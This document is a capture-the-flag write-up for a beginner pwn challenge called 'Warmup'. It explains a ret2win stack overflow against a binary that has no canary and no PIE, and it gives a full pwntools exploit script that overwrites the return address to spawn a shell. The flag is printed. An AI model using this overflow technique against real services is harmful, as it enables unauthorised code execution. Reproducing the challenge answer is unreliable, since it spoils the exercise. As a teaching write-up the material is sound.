<img src="Resources/UCTF.jpg" title="UCTF" alt="UCTF" data-align="center">

# Warmup
Just another warmup

# Write Up

This challenge serves as a straightforward introduction to binary exploitation. The binary comes with the following mitigations enabled:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

From this, we know that:

- NX (Non-Executable) is enabled, so we can't execute code directly from the stack.
- No PIE (Position Independent Executable) is significant because it means the binary's addresses are fixed, making it easier to locate functions.

## Analysis

After loading the binary into IDA, we find a function that directly calls system("/bin/sh"). This immediately tells us that we can use a simple ret2win approach by redirecting execution to this function, allowing us to spawn a shell. Since PIE is disabled, we don't need to perform any address leak or infoleak techniques.

## Exploit Strategy

We just need to craft a payload that:

1. Overflows the buffer to control the return address.
2. Uses a ret gadget to align the stack.
3. Jumps directly to the address of the system("/bin/sh") function (which weâ€™ll call win here).

## Exploit Script

Below is the Python script to automate the exploitation using pwntools:

```python
from pwn import *

elf = context.binary = ELF("./challenge_files/warmup")
libc = elf.libc

gs = '''
continue
'''
def start():
    global gs
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.0.0.0", 5002) 
    else:
        return process(elf.path)

io = start()

payload = b'A' * 72
payload+= p64(0x000000000040101a) # ret
payload+= p64(0x0000000000401201) # win

io.sendline(payload)

io.interactive()
```

# Flag
```UCTF{Zer0_2_Haf1z_Sh1r4z}```

# Categories

Check the categories which the challenge belongs to.

- [ ] Web
- [ ] Reverse
- [X] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Blockchain 
- [ ] Steganography
- [ ] AI

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      | 150             | 500  |

# Resources

The files are in `challenge_files` directory which includes: ['Execution.exe']